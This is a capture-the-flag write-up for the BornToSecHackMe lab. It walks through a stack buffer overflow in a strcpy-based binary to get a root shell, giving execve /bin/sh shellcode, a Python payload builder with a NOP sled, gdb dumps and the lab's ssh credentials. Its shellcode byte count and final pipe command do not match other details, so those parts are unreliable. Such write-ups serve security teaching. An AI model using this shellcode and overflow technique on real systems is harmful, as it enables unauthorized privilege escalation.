# BONUS2 :

Starting from the `zaz` user, another way to get access to the `root` user with the file `exploit_me` is to use a `shellcode`.

ssh user: `zaz`
ssh password: `646da671ca01bb5d84dbb5fb2238dc8e`

23 bytes shellcode from [here](https://www.hackthesec.co.in/2016/01/linuxx86-execve-binsh-shellcode-24-byte.html):  `\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80`

We need to add some `NOP slide` before our shellcode to be sure that even if our address is a bit moving we will still be able to get to our shellcode.

> EIP => 0xbffff75c
> Buffer beginning =>0xbffff6d0
> EIP - Buffer beginning = 140

Let's build our input with a python script `exploit.py`:

```python
import struct
overflow_offset = 140
beggining_of_nop_slide = 0xbffff640

shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
shellcode_len = len(shellcode)
NOP = "\x90" * (overflow_offset - shellcode_len - 30)
NOP2 = "\x90" * 30
EIP = struct.pack("I", (beggining_of_nop_slide + len(NOP) / 2))
print NOP + shellcode + NOP2 + EIP
```

```bash
zaz@BornToSecHackMe:~$ gdb -q ./exploit_me
(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:     push   %ebp
   0x080483f5 <+1>:     mov    %esp,%ebp
   0x080483f7 <+3>:     and    $0xfffffff0,%esp
   0x080483fa <+6>:     sub    $0x90,%esp
   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:    jg     0x804840d <main+25>
   0x08048406 <+18>:    mov    $0x1,%eax
   0x0804840b <+23>:    jmp    0x8048436 <main+66>
   0x0804840d <+25>:    mov    0xc(%ebp),%eax
   0x08048410 <+28>:    add    $0x4,%eax
   0x08048413 <+31>:    mov    (%eax),%eax
   0x08048415 <+33>:    mov    %eax,0x4(%esp)
   0x08048419 <+37>:    lea    0x10(%esp),%eax
   0x0804841d <+41>:    mov    %eax,(%esp)
   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:    lea    0x10(%esp),%eax
   0x08048429 <+53>:    mov    %eax,(%esp)
   0x0804842c <+56>:    call   0x8048310 <puts@plt>
   0x08048431 <+61>:    mov    $0x0,%eax
   0x08048436 <+66>:    leave
   0x08048437 <+67>:    ret
End of assembler dump.
(gdb) b *0x08048425
Breakpoint 1 at 0x8048425
(gdb) r `python exploit.py`
Starting program: /home/zaz/exploit_me `python exploit.py`

Breakpoint 1, 0x08048425 in main ()
(gdb) x/30x
Argument required (starting display address).
(gdb) x/30x $esp
0xbffff630:     0xbffff640      0xbffff899      0x00000001      0xb7ec3c49
0xbffff640:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff650:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff660:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff670:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff680:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff690:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff6a0:     0x50c03190      0x732f2f68
```

> start_of_nop_slide => 0xbffff640

Now we can edit our script by putting the `EIP` in the middle of the `NOP_SLIDE`  and simply use our script to get access to the root shell:

`python exploit.py | ./exploit_me`